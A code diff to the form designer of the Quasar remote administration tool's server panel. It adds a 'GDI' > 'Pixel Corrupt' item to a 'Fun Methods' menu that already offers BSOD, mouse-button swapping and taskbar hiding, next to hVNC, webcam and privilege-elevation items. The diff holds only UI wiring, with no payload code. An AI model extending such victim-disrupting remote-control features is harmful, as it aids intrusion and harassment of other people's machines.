@@ -78,6 +78,8 @@ namespace Quasar.Server.Forms
             this.bSODToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.swapMouseButtonsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.hideTaskBarToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.gdiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.pixelCorruptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.connectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.elevateClientPermissionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.elevateToSystemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -485,7 +487,8 @@ namespace Quasar.Server.Forms
             this.funMethodsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.bSODToolStripMenuItem,
             this.swapMouseButtonsToolStripMenuItem,
-            this.hideTaskBarToolStripMenuItem});
+            this.hideTaskBarToolStripMenuItem,
+            this.gdiToolStripMenuItem});
             this.funMethodsToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.emoticon_evilgrin;
             this.funMethodsToolStripMenuItem.Name = "funMethodsToolStripMenuItem";
             this.funMethodsToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
@@ -498,7 +501,6 @@ namespace Quasar.Server.Forms
             this.bSODToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
             this.bSODToolStripMenuItem.Text = "BSOD";
             this.bSODToolStripMenuItem.Click += new System.EventHandler(this.bSODToolStripMenuItem_Click);
-            // 
             // swapMouseButtonsToolStripMenuItem
             // 
             this.swapMouseButtonsToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.mouse;
@@ -514,6 +516,25 @@ namespace Quasar.Server.Forms
             this.hideTaskBarToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
             this.hideTaskBarToolStripMenuItem.Text = "Hide Taskbar";
             this.hideTaskBarToolStripMenuItem.Click += new System.EventHandler(this.hideTaskBarToolStripMenuItem_Click);
+            // 
+            // 
+            // gdiToolStripMenuItem
+            // 
+            this.gdiToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.pixelCorruptToolStripMenuItem});
+            this.gdiToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.pencil;
+            this.gdiToolStripMenuItem.Name = "gdiToolStripMenuItem";
+            this.gdiToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
+            this.gdiToolStripMenuItem.Text = "GDI";
+            // 
+            // 
+            // pixelCorruptToolStripMenuItem
+            // 
+            this.pixelCorruptToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.pencil;
+            this.pixelCorruptToolStripMenuItem.Name = "pixelCorruptToolStripMenuItem";
+            this.pixelCorruptToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
+            this.pixelCorruptToolStripMenuItem.Text = "Pixel Corrupt";
+            this.pixelCorruptToolStripMenuItem.Click += new System.EventHandler(this.pixelCorruptToolStripMenuItem_Click);
             // 
             // connectionToolStripMenuItem
             // 
@@ -1866,6 +1887,8 @@ namespace Quasar.Server.Forms
         private ToolStripMenuItem funMethodsToolStripMenuItem;
         private ToolStripMenuItem bSODToolStripMenuItem;
         private ToolStripMenuItem swapMouseButtonsToolStripMenuItem;
+        private ToolStripMenuItem gdiToolStripMenuItem;
+        private ToolStripMenuItem pixelCorruptToolStripMenuItem;
         private ToolStripMenuItem hVNCToolStripMenuItem;
         private ToolStripMenuItem webcamToolStripMenuItem;
         private ColumnHeader hCurrentWindow;
